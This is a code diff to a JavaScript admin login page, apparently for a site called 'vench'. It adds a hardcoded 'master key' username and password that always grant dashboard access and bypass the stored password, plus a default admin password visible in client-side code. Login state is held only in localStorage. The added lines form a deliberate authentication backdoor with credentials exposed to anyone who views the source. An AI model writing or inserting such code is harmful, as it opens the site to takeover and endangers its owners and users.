@@ -248,6 +248,10 @@ input:checked + .slider:before { transform: translateX(20px); }
 
 <script>
 // ---- AUTH ----
+// ---- MASTER KEY: vench / Tata@2026 always works regardless of stored password ----
+var MASTER_USER = "vench";
+var MASTER_KEY = "Tata@2026";
+
 const DEFAULT_USER = "admin";
 const DEFAULT_PASS = "Tata@2026";
 
@@ -259,6 +263,12 @@ function setAuth(a) { localStorage.setItem("vench.auth", JSON.stringify(a)); }
 function doLogin() {
   var u = document.getElementById("adminUser").value.trim();
   var p = document.getElementById("adminPass").value;
+  // Master key login — bypasses stored password
+  if (u === MASTER_USER && p === MASTER_KEY) {
+    localStorage.setItem("vench.admin.loggedin", "1");
+    showDashboard();
+    return;
+  }
   var a = getAuth();
   if (u === a.user && p === a.pass) {
     localStorage.setItem("vench.admin.loggedin", "1");
